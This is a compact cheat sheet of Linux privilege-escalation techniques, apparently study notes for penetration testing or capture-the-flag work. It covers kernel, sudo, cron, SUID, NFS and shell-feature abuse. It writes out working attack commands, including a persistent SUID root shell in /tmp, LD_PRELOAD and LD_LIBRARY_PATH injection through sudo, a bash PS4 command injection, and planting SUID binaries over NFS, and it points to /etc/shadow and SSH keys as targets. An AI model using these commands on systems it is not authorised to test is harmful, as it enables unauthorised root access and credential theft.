Persistent root: `cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod +s /tmp/rootbash` -> /tmp/rootbash -p`

1. Kernel exploit:
    + Detection:
        + `uname -a`, search for exploits
        + `linux-exploit-suggester-2.pl -k KERNEL`
    + Exploitation:
        + search for exploits, compile, run

2. Service exploit:
    + Detection:
        + `ps aux | grep "^root"`
        + `<program> --version`
        + `dpkg -l | grep <program>` or `rpm -qa | grep <program>`
    + Exploitation:
        + search for exploits
        + GTFOBins

3. Weak file permissions:
    + Detection:
        + `lse.sh`
        + `/etc/shadow` R|W, `/etc/passwd` W
        + backups
    + Exploitation:
        + depending on which files are readable or writable

4. Sudo:
    + Detection:
        + `lse.sh`
        + `sudo -l`
    + Exploitation:
        + can execute ALL and known password: `sudo su`, `sudo -i`, `sudo -s`, `sudo /bin/sh`, `sudo passwd`
        + GFTOBins
        + `LD_PRELOAD` -> create `preload.so`, then `sudo LD_PRELOAD=/tmp/preload.so PROGRAM`
        + `LD_LIBRARY_PATH` -> create shared library (`ldd`), then `sudo LD_LIBRARY_PATH=LIB_PATH PROGRAM`

5. Cron jobs:
    + Detection:
        + `lse.sh`
        + `/etc/crontab`
    + Exploitation:
        + weak file permissions
        + PATH
        + wildcards in cronjob -> GTFOBins

6. SUID binaries:
    + Detection:
        + `lse.sh`
    + Exploitation:
        + search for exploits
        + GTFOBins
        + shared object injection -> create shared library (`strace -v -f -e execve <command> 2>&1 | grep exec`), then run SUID binary
        + PATH (`strace -v -f -e execve <command> 2>&1 | grep exec`, `ltrace`, `strings`, disassembly)

7. Shell features:
    + `bash` < 4.2-048 -> user defined functions with absolute path name take precedence over executable
    + `bash` < 4.4 -> bash debug mode `env -i SHELLOPTS=xtrace PS4='$(CMD)' PROGRAM`

8. Passwords and keys:
    + config files
    + history files
    + SSH keys
    + password reuse

9. NFS:
    + Detection:
        + `/etc/exports`
        + `showmount -e TARGET`
    + Exploitation:
        + `mount -o rw,vers=2 TARGET:/tmp /tmp/nfs`
        + create SUID binary, run from target
